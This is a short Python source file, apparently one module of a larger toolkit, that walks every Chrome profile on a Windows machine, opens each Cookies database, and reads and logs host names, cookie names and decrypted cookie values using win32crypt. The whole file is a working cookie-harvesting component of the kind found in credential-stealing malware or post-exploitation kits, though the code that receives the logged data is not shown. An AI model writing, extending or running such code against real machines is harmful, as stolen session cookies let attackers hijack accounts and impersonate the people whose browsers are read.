# coding: utf-8

try:
	import os
	import sqlite3
	import win32crypt
except ImportError:
	pass

from modules.windows.chrome.chrome_module import ChromeModule


class WindowsChromeCookie(ChromeModule):
	def __init__(self):
		ChromeModule.__init__(
			self,
			name='WindowsChromeCookie',
			version='0.1.0',
			file=__file__,
			dependencies=['os', 'sqlite3', 'win32crypt'],
		)

	def execute(self) -> bool:
		if not super().execute():
			return False

		for profile in self.get_profiles():
			cookie_path = profile + '\\Cookies'
			if os.path.isfile(cookie_path):
				connection = sqlite3.connect(cookie_path)
				cursor = connection.cursor()
				self.cursor_get_and_log(cursor, 'host_key,name,encrypted_value', 'cookies', decrypt_ids=[2])

		return True
